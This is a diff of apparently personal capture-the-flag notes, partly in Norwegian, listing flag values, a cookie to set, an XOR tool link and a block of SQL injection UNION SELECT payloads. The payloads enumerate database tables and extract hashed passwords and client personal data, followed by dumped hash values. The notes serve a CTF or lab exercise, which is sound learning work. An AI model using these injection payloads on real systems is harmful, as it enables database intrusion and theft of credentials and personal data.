@@ -112,6 +112,9 @@ endre cookie til 000000000a7dce5ac40e7a88fd61399bbe76da161c1d65cbc2ebf2bd364545e
 
 # Flag10
 Flag10: cfd650ecf156952e7764710e18c0b4fcb2179e3c48ac922ee4bb1d3d2210e8 
+
+https://onlinehextools.com/xor-hex-numbers 
+
 ```
 1 union select null, concat(table_name) from information_schema.tables where table_schema=database()
 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
@@ -119,15 +122,6 @@ Flag10: cfd650ecf156952e7764710e18c0b4fcb2179e3c48ac922ee4bb1d3d2210e8
 
 1 AND 1=2 UNION SELECT HashedPassword, CONCAT(user_id99, first_name64, last_namecc, birthdate, email60, town91, country3e, comment92) FROM clients
 1 AND 1=2 UNION SELECT HashedPassword FROM clients
-
-
-
-
-
-
-
-
-
 
 0781eeb28b88a1b9d57388163ae891fe6755096c34f24884584eb4d5b0842934
 072472842cce7d49595202c4ceb061b7337282864ac89fc83444593e0f71ad37
@@ -165,12 +159,6 @@ Flag10: cfd650ecf156952e7764710e18c0b4fcb2179e3c48ac922ee4bb1d3d2210e8
 0707c88b56cb8c4a1411d4e61d50a60e0db86f5dbb98f0242d660eaf54a282cf
 0779df153e311abd1648885a219360c41a8b37dd5544c6949c4629aaa13b5532
 075aa3e076b30d9ff06a41db069b813ce25159d66b6352fde078c633a8d29f78
-
-
-
-
-
-
 ```
 
 # Flag11
